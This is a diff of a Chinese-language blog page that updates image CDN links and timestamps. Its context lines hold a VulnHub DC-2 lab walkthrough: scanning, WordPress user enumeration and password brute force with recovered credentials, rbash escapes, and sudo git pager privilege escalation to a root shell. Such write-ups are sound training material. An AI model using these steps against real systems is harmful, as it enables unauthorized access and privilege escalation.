@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-11T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:04:40.419Z">
+<meta property="article:modified_time" content="2026-05-14T13:37:56.005Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="VulnHub">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8nd">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbjbi">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-11T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-11T12:00:00+08:00","description":"","headline":"VulnHub DC-2 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/56741b23/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/56741b23/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, WordPress","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-11T12:00:00+08:00","dateModified":"2026-05-14T21:37:56+08:00","datePublished":"2026-03-11T12:00:00+08:00","description":"","headline":"VulnHub DC-2 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/56741b23/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/56741b23/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, WordPress","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -137,8 +137,8 @@
 <h2 id="🔍-主机发现"><a href="#🔍-主机发现" class="headerlink" title="🔍 主机发现"></a>🔍 主机发现</h2><p>使用 nmap 对整个网段进行存活探测：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.67.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image1.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image2.png"></p>
 <hr>
 <h2 id="🔎-端口扫描"><a href="#🔎-端口扫描" class="headerlink" title="🔎 端口扫描"></a>🔎 端口扫描</h2><h3 id="nmap-速度参数说明"><a href="#nmap-速度参数说明" class="headerlink" title="nmap 速度参数说明"></a>nmap 速度参数说明</h3><table>
 <thead>
@@ -171,11 +171,11 @@
 <p>使用 <code>-p-</code> 全端口扫描：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -p- 192.168.67.132</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image3.png"></p>
 <p>扫描结果发现开放了 <strong>Web（80）</strong> 和 <strong>SSH（7744）</strong> 两个端口。</p>
 <hr>
 <h2 id="🌐-信息收集"><a href="#🌐-信息收集" class="headerlink" title="🌐 信息收集"></a>🌐 信息收集</h2><h3 id="配置-hosts-解析"><a href="#配置-hosts-解析" class="headerlink" title="配置 hosts 解析"></a>配置 hosts 解析</h3><p>直接访问ip url变成了dc-2</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image4.png"></p>
 <p>由于靶机使用域名 <code>dc-2</code>，需要在本地 hosts 文件中添加解析。</p>
 <ul>
 <li><strong>Windows 路径</strong>：<code>C:\Windows\System32\drivers\etc\hosts</code></li>
@@ -185,34 +185,34 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.67.132 dc-2&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
 <p>Windows 系统需要以管理员身份打开记事本编辑 hosts 文件，添加以下行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.67.132 dc-2</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image5.png"></p>
 <p>在网页底部可以看到 CMS 指纹信息：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image6.png"></p>
 <h3 id="使用-WhatWeb-识别-CMS"><a href="#使用-WhatWeb-识别-CMS" class="headerlink" title="使用 WhatWeb 识别 CMS"></a>使用 WhatWeb 识别 CMS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v http://dc-2</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image8.png"><br>插件识别结果：<br><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image8.png"><br>插件识别结果：<br><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image7.png"></p>
 <p>确认使用的是 <strong>WordPress</strong> CMS，版本信息已获取。</p>
-<p>浏览网页，看到flag1<br><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image9.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image10.png"></p>
+<p>浏览网页，看到flag1<br><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image10.png"></p>
 <blockquote>
 <p>💡 <strong>Tips</strong>：WhatWeb 是一款 Web 应用指纹识别工具，能识别 CMS、框架、服务器类型、JS 库等信息，是信息收集阶段的常用工具之一。</p>
 </blockquote>
 <hr>
 <h2 id="📂-目录扫描"><a href="#📂-目录扫描" class="headerlink" title="📂 目录扫描"></a>📂 目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://dc-2</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image11.png"></p>
 <p>发现 WordPress 后台登录页面：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dc-2/wp-login.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image12.png"></p>
 <hr>
 <h2 id="🔧-WPScan-用户枚举"><a href="#🔧-WPScan-用户枚举" class="headerlink" title="🔧 WPScan 用户枚举"></a>🔧 WPScan 用户枚举</h2><p><strong>WPScan</strong> 是一款专门针对 <strong>WordPress</strong> 网站的黑盒扫描器，是渗透测试中处理此类 CMS 的”行业标准”工具。</p>
 <h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取版本信息</span></span><br><span class="line">wpscan --url http://dc-2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描插件</span></span><br><span class="line">wpscan --url http://dc-2 --enumerate p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举用户</span></span><br><span class="line">wpscan --url http://dc-2 --enumerate u</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image13.png"></p>
 <p>枚举到三个用户，保存到 <code>users.txt</code>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;admin\ntom\njerry&quot;</span> &gt; users.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image14.png"></p>
 <hr>
 <h2 id="🔑-cewl-字典生成-密码爆破"><a href="#🔑-cewl-字典生成-密码爆破" class="headerlink" title="🔑 cewl 字典生成 + 密码爆破"></a>🔑 cewl 字典生成 + 密码爆破</h2><h3 id="cewl-介绍"><a href="#cewl-介绍" class="headerlink" title="cewl 介绍"></a>cewl 介绍</h3><p><strong>cewl</strong>（Custom Word List generator）是一个非常独特的自定义字典生成工具。</p>
 <p>在渗透测试中，如果常规字典（如 rockyou.txt）爆破失败，渗透者会使用 cewl 针对目标网站进行”定制化”攻击。</p>
@@ -224,11 +224,11 @@
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w passwords.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image15.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image16.png"></p>
 <h3 id="WPScan-密码爆破"><a href="#WPScan-密码爆破" class="headerlink" title="WPScan 密码爆破"></a>WPScan 密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image17.png"></p>
 <p>🎉 <strong>爆破成功，获得两组凭据：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line">| Username: jerry, Password: adipiscing</span><br><span class="line">| Username: tom,   Password: parturient</span><br></pre></td></tr></table></figure>
 
@@ -238,39 +238,39 @@
 <p>可以用xshell连接，也可以直接用命令行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.67.132 -p 7744</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image20.png"></p>
 <ul>
 <li>jerry 登不上 SSH</li>
 <li><strong>tom 可以登录</strong> ✅</li>
 </ul>
 <h3 id="rbash-限制"><a href="#rbash-限制" class="headerlink" title="rbash 限制"></a>rbash 限制</h3><p>登录后发现是 <strong>rbash（受限 shell）</strong>，很多命令无法使用，路径被限制，<code>/</code> 被禁止。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image21.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image22.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image21.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image23.png"></p>
 <blockquote>
 <p>💡 <strong>rbash 是什么？</strong><br>rbash（restricted bash）是 bash 的受限模式，限制用户执行包含 <code>/</code> 的命令、修改 PATH、使用重定向等操作，常用于限制低权限用户的操作范围。</p>
 </blockquote>
 <h3 id="rbash-逃逸方式一：vi"><a href="#rbash-逃逸方式一：vi" class="headerlink" title="rbash 逃逸方式一：vi"></a>rbash 逃逸方式一：vi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image24.png"></p>
 <p>逃出 rbash 后修复 PATH：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image26.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image26.png"></p>
 <h3 id="rbash-逃逸方式二：BASH-CMDS（无需-vi）"><a href="#rbash-逃逸方式二：BASH-CMDS（无需-vi）" class="headerlink" title="rbash 逃逸方式二：BASH_CMDS（无需 vi）"></a>rbash 逃逸方式二：BASH_CMDS（无需 vi）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a      <span class="comment"># 把 /bin/sh 注册为命令 a，执行后逃出 rbash</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/      <span class="comment"># 将 /bin 加入 PATH 环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin   <span class="comment"># 将 /usr/bin 加入 PATH 环境变量</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>💡 <code>BASH_CMDS</code> 是 bash 内置的命令哈希表，rbash 限制了外部命令执行，但无法阻止操作这个内置表，因此可以借此逃逸。</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image27.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image27.png"></p>
 <blockquote>
 <p>📖 更多 rbash 逃逸姿势参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7237">https://xz.aliyun.com/news/7237</a></p>
 </blockquote>
 <h3 id="切换到-jerry"><a href="#切换到-jerry" class="headerlink" title="切换到 jerry"></a>切换到 jerry</h3><p>看到flag4</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image28.png"></p>
 <hr>
 <h2 id="⚡-git-提权"><a href="#⚡-git-提权" class="headerlink" title="⚡ git 提权"></a>⚡ git 提权</h2><h3 id="查找-sudo-权限"><a href="#查找-sudo-权限" class="headerlink" title="查找 sudo 权限"></a>查找 sudo 权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
 
@@ -280,15 +280,15 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 <p>找到可疑的 SUID 二进制文件后，去 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/">GTFOBins</a> 查找对应的利用方式。</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image29.png"></p>
 <h3 id="git-pager-提权"><a href="#git-pager-提权" class="headerlink" title="git pager 提权"></a>git pager 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git -p <span class="built_in">help</span></span><br></pre></td></tr></table></figure>
 
 <p>进入 pager 界面后输入：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image30.png"></p>
 <p>🎉 <strong>成功获取 root shell！</strong></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-2_image31.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-2_image31.png"></p>
 <hr>
 <h2 id="📝-总结"><a href="#📝-总结" class="headerlink" title="📝 总结"></a>📝 总结</h2><table>
 <thead>
@@ -795,7 +795,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8ne" defer></script>
+<script src="/js/main.js?v=mp5jbjbk" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1059,7 +1059,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8nf"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbjbk"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
